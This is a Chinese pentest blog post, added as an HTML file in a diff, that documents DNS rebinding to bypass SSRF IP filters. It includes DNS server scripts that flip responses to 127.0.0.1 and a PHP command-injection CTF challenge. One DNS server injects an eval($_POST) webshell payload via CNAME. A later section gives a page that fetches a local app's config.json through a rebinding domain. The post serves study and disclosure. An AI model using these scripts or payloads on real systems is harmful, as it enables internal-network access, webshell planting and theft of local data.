@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>DNS Rebinding</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/dns-rebinding.html" rel="bookmark"
+           title="Permalink to DNS Rebinding">DNS Rebinding</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-12-06T00:00:00+01:00">
+                <a href='#'>12/06/2017 </a>
+                <a href="/category/learning.html">Learning</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>最后的链接是关于dns rebinding的文章，这里主要做一个笔记：</p>
+<p>先盗用ricterz.me的博客一个图
+<img alt="" src="http://7d9lm5.com1.z0.glb.clouddn.com/2017-01-18-183643.jpg"></p>
+<p>在ssrf的时候，客户修复过之后。再次判断url的时候，逻辑就是上图这个样子。</p>
+<ol>
+<li>获取请求的地址，如果是域名，通过DNS解析的方式获取真实IP，如果是IP则直接对比是否在指定的IP段内。</li>
+<li>比如获取了test.loli.club请求地址是10.0.0.1，黑名单是10.0.0.0/8，则拒绝访问</li>
+</ol>
+<p>使用DNS Rebinding的会有这样的攻击效果:</p>
+<ol>
+<li>获取test.loli.club的请求地址不是10.0.0.0/8这个黑名单范围里面</li>
+<li>放行之后，然后后端请求这个URL的资源。如果TTL足够小，这个时候会又发生一次DNS解析。如果这个URL可控，我们就可以控制这次的解析IP。</li>
+</ol>
+<p>DNS返回的数据包存在一个TTL(Time-to-Live),也就是域名解析记录在DNS服务器上的缓存时间。如果两次DNS的请求时间大于TTL，就会重新进行一次DNS解析请求。</p>
+<p>所以，第一次发生DNS解析的时候，返回一个不在黑名单的IP地址，第二次服务端URL请求的时候，让服务器返回一次DNS解析，解析到黑名单地址，从而绕过。</p>
+<p>根据goychou大神的脚本，测试以下步骤：</p>
+<ul>
+<li>添加一个A记录，域名是ns.xyz.pw，指向服务器A</li>
+<li>再添加一个ns记录，域名是rebind.xyz.pw，指向ns.xyz.pw</li>
+</ul>
+<p>此时在A服务器上运行脚本:</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">twisted.internet</span> <span class="kn">import</span> <span class="n">reactor</span><span class="p">,</span> <span class="n">defer</span>
+<span class="kn">from</span> <span class="nn">twisted.names</span> <span class="kn">import</span> <span class="n">client</span><span class="p">,</span> <span class="n">dns</span><span class="p">,</span> <span class="n">error</span><span class="p">,</span> <span class="n">server</span>
+<span class="n">record</span><span class="o">=</span><span class="p">{}</span>
+<span class="k">class</span> <span class="nc">DynamicResolver</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">_doDynamicResponse</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">):</span>
+        <span class="n">name</span> <span class="o">=</span> <span class="n">query</span><span class="o">.</span><span class="n">name</span><span class="o">.</span><span class="n">name</span>
+        <span class="k">if</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">record</span> <span class="ow">or</span> <span class="n">record</span><span class="p">[</span><span class="n">name</span><span class="p">]</span><span class="o">&lt;</span><span class="mi">1</span><span class="p">:</span>
+            <span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;A IP&quot;</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">ip</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>
+        <span class="k">if</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">record</span><span class="p">:</span>
+            <span class="n">record</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="n">record</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="k">print</span> <span class="n">name</span> <span class="o">+</span> <span class="s2">&quot; ===&gt; &quot;</span> <span class="o">+</span> <span class="n">ip</span>
+        <span class="n">answer</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">RRHeader</span><span class="p">(</span>
+            <span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">,</span>
+            <span class="nb">type</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">A</span><span class="p">,</span>
+            <span class="bp">cls</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">IN</span><span class="p">,</span>
+            <span class="n">ttl</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">Record_A</span><span class="p">(</span><span class="n">address</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">ip</span><span class="p">,</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+        <span class="p">)</span>
+        <span class="n">answers</span> <span class="o">=</span> <span class="p">[</span><span class="n">answer</span><span class="p">]</span>
+        <span class="n">authority</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="n">additional</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">return</span> <span class="n">answers</span><span class="p">,</span> <span class="n">authority</span><span class="p">,</span> <span class="n">additional</span>
+    <span class="k">def</span> <span class="nf">query</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">defer</span><span class="o">.</span><span class="n">succeed</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_doDynamicResponse</span><span class="p">(</span><span class="n">query</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">factory</span> <span class="o">=</span> <span class="n">server</span><span class="o">.</span><span class="n">DNSServerFactory</span><span class="p">(</span>
+        <span class="n">clients</span><span class="o">=</span><span class="p">[</span><span class="n">DynamicResolver</span><span class="p">(),</span> <span class="n">client</span><span class="o">.</span><span class="n">Resolver</span><span class="p">(</span><span class="n">resolv</span><span class="o">=</span><span class="s1">&#39;/etc/resolv.conf&#39;</span><span class="p">)]</span>
+    <span class="p">)</span>
+    <span class="n">protocol</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">DNSDatagramProtocol</span><span class="p">(</span><span class="n">controller</span><span class="o">=</span><span class="n">factory</span><span class="p">)</span>
+    <span class="n">reactor</span><span class="o">.</span><span class="n">listenUDP</span><span class="p">(</span><span class="mi">53</span><span class="p">,</span> <span class="n">protocol</span><span class="p">)</span>
+    <span class="n">reactor</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="k">raise</span> <span class="ne">SystemExit</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
+</pre></div>
+
+
+<p>此时，在Linux上面运行：</p>
+<div class="highlight"><pre><span></span><span class="n">dig</span> <span class="mf">@8.8.8.8</span> <span class="n">rebind</span><span class="p">.</span><span class="n">xyz</span><span class="p">.</span><span class="n">pw</span>
+<span class="err">返回结果是</span><span class="n">A主机的IP</span>
+
+<span class="err">再次运行上面的命令</span><span class="o">:</span>
+<span class="n">dig</span> <span class="mf">@8.8.8.8</span> <span class="n">rebind</span><span class="p">.</span><span class="n">xyz</span><span class="p">.</span><span class="n">pw</span>
+<span class="err">返回结果是</span><span class="mf">127.0.0.1</span>
+</pre></div>
+
+
+<h3>TIPS</h3>
+<p>以下是从joychou大神博客来的：
+在Linux，默认不会进行DNS缓存，除非运行nscd，dnsmaq等。</p>
+<p>另外一个是Ph牛出的与dns有关的题目:</p>
+<div class="highlight"><pre><span></span><span class="o">&lt;</span>?<span class="nv">php</span>
+<span class="nv">header</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">Content-Type: text/plain</span><span class="s1">&#39;</span><span class="ss">)</span><span class="c1">;</span>
+$<span class="nv">ip</span> <span class="o">=</span> $<span class="nv">_GET</span>[<span class="s1">&#39;</span><span class="s">ip</span><span class="s1">&#39;</span>]??<span class="k">exit</span><span class="c1">;</span>
+<span class="nv">duita</span><span class="ss">(</span>$<span class="nv">ip</span><span class="ss">)</span><span class="c1">;</span>
+$<span class="nv">ip</span> <span class="o">=</span> <span class="nv">escapeshellcmd</span><span class="ss">(</span>$<span class="nv">ip</span><span class="ss">)</span><span class="c1">;</span>
+$<span class="nv">ip</span> <span class="o">=</span> <span class="nv">str_replace</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">\&gt;</span><span class="s1">&#39;</span>, <span class="s1">&#39;</span><span class="s">&gt;</span><span class="s1">&#39;</span>, $<span class="nv">ip</span><span class="ss">)</span><span class="c1">;</span>
+$<span class="nv">ip</span> <span class="o">=</span> <span class="nv">str_replace</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">\&lt;</span><span class="s1">&#39;</span>, <span class="s1">&#39;</span><span class="s">&lt;</span><span class="s1">&#39;</span>, $<span class="nv">ip</span><span class="ss">)</span><span class="c1">;</span>
+<span class="mh">$c</span><span class="nv">md</span> <span class="o">=</span> <span class="k">sprintf</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">ping -c 2 %s</span><span class="s1">&#39;</span>, $<span class="nv">ip</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">echo</span> <span class="nv">shell_exec</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">md</span><span class="ss">)</span><span class="c1">;</span>
+
+<span class="nv">function</span> <span class="nv">duita</span><span class="ss">(</span>$<span class="nv">ip</span><span class="ss">)</span>
+{
+    <span class="k">if</span><span class="ss">(</span><span class="nv">strpbrk</span><span class="ss">(</span>$<span class="nv">ip</span>, <span class="s2">&quot;</span><span class="s">&amp;;`|*?()$</span><span class="se">\\</span><span class="s">\x00</span><span class="s2">&quot;</span><span class="ss">)</span> <span class="o">!==</span> <span class="nv">false</span><span class="ss">)</span> {
+        <span class="k">exit</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">WAF</span><span class="s1">&#39;</span><span class="ss">)</span><span class="c1">;</span>
+    }
+    <span class="k">if</span><span class="ss">(</span><span class="nv">stripos</span><span class="ss">(</span>$<span class="nv">ip</span>, <span class="s1">&#39;</span><span class="s">.php</span><span class="s1">&#39;</span><span class="ss">)</span> <span class="o">!==</span> <span class="nv">false</span><span class="ss">)</span> {
+        <span class="k">exit</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">WAF</span><span class="s1">&#39;</span><span class="ss">)</span><span class="c1">;</span>
+    }
+}
+</pre></div>
+
+
+<ul>
+<li>没有过滤<code>&gt;</code></li>
+<li><code>"</code> <code>'</code>在成对的情况下escapeshellcmd是不会过滤的，所以<code>.p''php</code>绕过waf</li>
+</ul>
+<p>搭建一个dns服务器:</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">datetime</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">import</span> <span class="nn">traceback</span>
+<span class="kn">import</span> <span class="nn">socketserver</span>
+<span class="kn">from</span> <span class="nn">dnslib</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">TTL</span> <span class="o">=</span> <span class="mi">300</span>
+<span class="k">def</span> <span class="nf">dns_response</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">request</span> <span class="o">=</span> <span class="n">DNSRecord</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">reply</span> <span class="o">=</span> <span class="n">DNSRecord</span><span class="p">(</span><span class="n">DNSHeader</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">id</span><span class="p">,</span> <span class="n">qr</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">aa</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">ra</span><span class="o">=</span><span class="mi">1</span><span class="p">),</span> <span class="n">q</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">q</span><span class="p">)</span>
+    <span class="n">qname</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">q</span><span class="o">.</span><span class="n">qname</span>
+    <span class="n">qn</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">qname</span><span class="p">)</span>
+    <span class="n">qtype</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">q</span><span class="o">.</span><span class="n">qtype</span>
+    <span class="n">qt</span> <span class="o">=</span> <span class="n">QTYPE</span><span class="p">[</span><span class="n">qtype</span><span class="p">]</span>
+    <span class="k">if</span> <span class="n">qn</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;rebind.xyz.pw&#39;</span><span class="p">):</span>
+        <span class="n">rdata</span> <span class="o">=</span> <span class="n">CNAME</span><span class="p">(</span><span class="s1">&#39;&lt;?=eval($_POST[1]?&gt;.xyz.pw&#39;</span><span class="p">)</span>
+        <span class="n">reply</span><span class="o">.</span><span class="n">add_answer</span><span class="p">(</span><span class="n">RR</span><span class="p">(</span><span class="n">rname</span><span class="o">=</span><span class="n">qname</span><span class="p">,</span> <span class="n">rtype</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">rclass</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">ttl</span><span class="o">=</span><span class="n">TTL</span><span class="p">,</span> <span class="n">rdata</span><span class="o">=</span><span class="n">rdata</span><span class="p">))</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">rdata</span> <span class="o">=</span> <span class="n">A</span><span class="p">(</span><span class="s1">&#39;172.96.210.188&#39;</span><span class="p">)</span>
+        <span class="n">reply</span><span class="o">.</span><span class="n">add_answer</span><span class="p">(</span><span class="n">RR</span><span class="p">(</span><span class="n">rname</span><span class="o">=</span><span class="n">qname</span><span class="p">,</span> <span class="n">rtype</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">rclass</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">ttl</span><span class="o">=</span><span class="n">TTL</span><span class="p">,</span> <span class="n">rdata</span><span class="o">=</span><span class="n">rdata</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;----Replay:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">reply</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">reply</span><span class="o">.</span><span class="n">pack</span><span class="p">()</span>
+
+<span class="k">class</span> <span class="nc">BaseRequestHandler</span><span class="p">(</span><span class="n">socketserver</span><span class="o">.</span><span class="n">BaseRequestHandler</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">get_data</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">raise</span> <span class="ne">NotImplementedError</span>
+    <span class="k">def</span> <span class="nf">send_data</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+        <span class="k">raise</span> <span class="ne">NotImplementedError</span>
+    <span class="k">def</span> <span class="nf">handle</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">now</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">()</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S:</span><span class="si">%f</span><span class="s1">&#39;</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_data</span><span class="p">()</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">send_data</span><span class="p">(</span><span class="n">dns_response</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+            <span class="n">traceback</span><span class="o">.</span><span class="n">print_exc</span><span class="p">(</span><span class="nb">file</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>
+
+<span class="k">class</span> <span class="nc">TCPRequestHandler</span><span class="p">(</span><span class="n">BaseRequestHandler</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">get_data</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="n">sz</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[:</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">sz</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">-</span><span class="mi">2</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&quot;Wrong size of TCP Packet&quot;</span><span class="p">)</span>
+        <span class="k">elif</span> <span class="n">sz</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">-</span><span class="mi">2</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&quot;Too big TCP Packet&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span>
+
+    <span class="k">def</span> <span class="nf">send_data</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+        <span class="n">sz</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">sz</span> <span class="o">+</span> <span class="n">data</span><span class="p">)</span>
+
+<span class="k">class</span> <span class="nc">UDPRequestHandler</span><span class="p">(</span><span class="n">BaseRequestHandler</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">get_data</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="k">def</span> <span class="nf">send_data</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">client_address</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Starting nameserver&quot;</span><span class="p">)</span>
+    <span class="n">servers</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="n">socketserver</span><span class="o">.</span><span class="n">ThreadingUDPServer</span><span class="p">((</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="mi">53</span><span class="p">),</span><span class="n">UDPRequestHandler</span><span class="p">),</span>
+        <span class="n">socketserver</span><span class="o">.</span><span class="n">ThreadingTCPServer</span><span class="p">((</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">53</span><span class="p">),</span><span class="n">TCPRequestHandler</span><span class="p">),</span>
+    <span class="p">]</span>
+    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">servers</span><span class="p">:</span>
+        <span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">)</span>
+        <span class="n">thread</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2"> server loop running in thread: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">RequestHandlerClass</span><span class="o">.</span><span class="vm">__name__</span><span class="p">[:</span><span class="mi">3</span><span class="p">],</span> <span class="n">thread</span><span class="o">.</span><span class="n">name</span><span class="p">))</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="k">pass</span>
+    <span class="k">finally</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">servers</span><span class="p">:</span>
+            <span class="n">s</span><span class="o">.</span><span class="n">shutdown</span><span class="p">()</span>
+</pre></div>
+
+
+<p>这样：</p>
+<div class="highlight"><pre><span></span><span class="nx">dig</span> <span class="nx">rebind</span><span class="p">.</span><span class="nx">xyz</span><span class="p">.</span><span class="nx">pw的时候其中的cname是shell</span><span class="err">，</span><span class="nx">但是本地ping的时候出现uknow</span> <span class="nx">host的错误</span>
+ <span class="nx">dig</span> <span class="nx">rebind</span><span class="p">.</span><span class="nx">xyz</span><span class="p">.</span><span class="nx">pw</span>
+
+<span class="p">;</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="nx">DiG</span> <span class="mf">9.8.3</span><span class="o">-</span><span class="nx">P1</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="nx">rebind</span><span class="p">.</span><span class="nx">xyz</span><span class="p">.</span><span class="nx">pw</span>
+<span class="p">;;</span> <span class="nx">global</span> <span class="nx">options</span><span class="o">:</span> <span class="o">+</span><span class="nx">cmd</span>
+<span class="p">;;</span> <span class="nx">Got</span> <span class="nx">answer</span><span class="o">:</span>
+<span class="p">;;</span> <span class="o">-&gt;&gt;</span><span class="nx">HEADER</span><span class="o">&lt;&lt;-</span> <span class="nx">opcode</span><span class="o">:</span> <span class="nx">QUERY</span><span class="p">,</span> <span class="nx">status</span><span class="o">:</span> <span class="nx">NOERROR</span><span class="p">,</span> <span class="nx">id</span><span class="o">:</span> <span class="mi">56051</span>
+<span class="p">;;</span> <span class="nx">flags</span><span class="o">:</span> <span class="nx">qr</span> <span class="nx">rd</span> <span class="nx">ra</span><span class="p">;</span> <span class="nx">QUERY</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">ANSWER</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">AUTHORITY</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">ADDITIONAL</span><span class="o">:</span> <span class="mi">0</span>
+
+<span class="p">;;</span> <span class="nx">QUESTION</span> <span class="nx">SECTION</span><span class="o">:</span>
+<span class="p">;</span><span class="nx">rebind</span><span class="p">.</span><span class="nx">xyz</span><span class="p">.</span><span class="nx">pw</span><span class="p">.</span>         <span class="nx">IN</span>  <span class="nx">A</span>
+
+<span class="p">;;</span> <span class="nx">ANSWER</span> <span class="nx">SECTION</span><span class="o">:</span>
+<span class="nx">rebind</span><span class="p">.</span><span class="nx">xyz</span><span class="p">.</span><span class="nx">pw</span><span class="p">.</span>      <span class="mi">300</span> <span class="nx">IN</span>  <span class="nx">CNAME</span>   <span class="cp">&lt;?</span><span class="o">=</span><span class="k">eval</span><span class="nx">\</span><span class="p">(</span><span class="nx">\</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="cp">?&gt;</span><span class="p">.</span><span class="nx">xyz</span><span class="p">.</span><span class="nx">pw</span><span class="p">.</span>
+
+<span class="p">;;</span> <span class="nx">Query</span> <span class="nx">time</span><span class="o">:</span> <span class="mi">1266</span> <span class="nx">msec</span>
+<span class="p">;;</span> <span class="nx">SERVER</span><span class="o">:</span> <span class="mf">202.101.172.35</span><span class="err">#</span><span class="mi">53</span><span class="p">(</span><span class="mf">202.101.172.35</span><span class="p">)</span>
+<span class="p">;;</span> <span class="nx">WHEN</span><span class="o">:</span> <span class="nx">Wed</span> <span class="nx">Dec</span>  <span class="mi">6</span> <span class="mi">15</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mi">56</span> <span class="mi">2017</span>
+<span class="p">;;</span> <span class="nx">MSG</span> <span class="nx">SIZE</span>  <span class="nx">rcvd</span><span class="o">:</span> <span class="mi">66</span>
+
+
+<span class="nx">复现失败</span>
+</pre></div>
+
+
+<p>======
+2019/06/05更新:</p>
+<p>这几天上网只能用v2rayX，看到在8070端口起了一个http服务，想起来微信爆出来的可以利用DNS Rebinding获取微信号的内容，看了下本地的服务跟微信插件的类似，甚至用的都是GCDWebServer，开始本地捣鼓一下能不能获取到配置文件。最后测试是可以的，就是得在页面等1分多钟，因为会有dns解析的缓存。</p>
+<p>测试代码搬的: https://0x0d.im/archives/get-visitor-qq-number-through-dns-rebinding.html</p>
+<p><code>&lt;!DCTYPE html&gt;
+    &lt;html lang="en"&gt;
+    &lt;head&gt;
+        &lt;meta charset="UTF-8"&gt;
+        &lt;title&gt;Rebind Test&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;script src="http://upcdn.b0.upaiyun.com/libs/jquery/jquery-2.0.3.min.js"&gt;&lt;/script&gt;
+        &lt;script&gt;
+        function GetUin(){
+        console.log("Testing");
+            $.ajax({
+            url: "http://rebind.xyz.xyz:8070/config.json",
+            type: "GET",
+            dataType: "text",
+            success: function(data){
+                alert(data);
+        console.log(data);
+                }
+            });
+        }
+        setTimeout("GetUin()", 5000);
+    setTimeout("GetUin()", 7000);
+    setTimeout("GetUin()", 8000);
+    setTimeout("GetUin()", 30000);
+        setTimeout("GetUin()", 60000);
+        setTimeout("GetUin()", 90000);
+        &lt;/script&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;</code></p>
+<p>坑:</p>
+<p>昨天测了大半天，中间只成功了一次，大概是踩狗屎了。
+chrome下做的测试，做完清缓存:</p>
+<ol>
+<li>chrome://net-internals/#dns 和 chrome://net-internals/#sockets</li>
+<li>chrome的清理缓存文件，历史纪录什么的</li>
+<li>dscacheutil -flushcache;sudo killall -HUP mDNSResponder</li>
+</ol>
+<p>rebind.xyz.xyz的ttl我设置了为2分钟，找了半天没有设置为0的dns解析服务。最后测试成功，撒花，怪不得微信插件那个要等1分多钟，测完给作者提了个bug，貌似是注册这么久第一次给人提bug。</p>
+<p>这种本地起web服务的很容易受到攻击，就我查到的有:</p>
+<ol>
+<li>visual studio远程命令执行</li>
+<li>暴雪的一款游戏什么的</li>
+<li>QQ的获取QQ号码和微信插件获取好友列表</li>
+</ol>
+<p>先挖坑，以后再补</p>
+<ul>
+<li><a href="https://joychou.org/web/use-dnsrebinding-to-bypass-ssrf-in-java.html">https://joychou.org/web/use-dnsrebinding-to-bypass-ssrf-in-java.html</a></li>
+<li><a href="https://ricterz.me/posts/Use%20DNS%20Rebinding%20to%20Bypass%20IP%20Restriction">https://ricterz.me/posts/Use%20DNS%20Rebinding%20to%20Bypass%20IP%20Restriction</a></li>
+<li><a href="https://virusdefender.net/index.php/archives/685/">https://virusdefender.net/index.php/archives/685/</a></li>
+</ul>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
